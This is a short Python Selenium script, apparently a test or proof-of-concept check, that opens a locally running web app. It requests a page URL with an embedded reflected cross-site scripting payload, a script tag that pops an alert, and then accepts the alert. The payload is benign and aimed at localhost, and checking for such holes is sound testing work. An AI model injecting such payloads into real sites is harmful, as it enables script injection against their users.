from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert 
parser = argparse.ArgumentParser(description='Port IP')
parser.add_argument('-p', dest='port', default=8001,
                    help='port where the application is running')

args = parser.parse_args()
port = args.port
browser = webdriver.Firefox()
try:
    browser.get(f"http://localhost:{port}/page/display/this%20html%20contains%20reflective%20xss%3Cscript%3Ealert('this%20is%20a%20reflective%20xss')%3C/script%3E")
    time.sleep(3)
    browser.set_window_size(827, 707)
    browser.switch_to.alert.accept()
    time.sleep(1)
except:
    exit()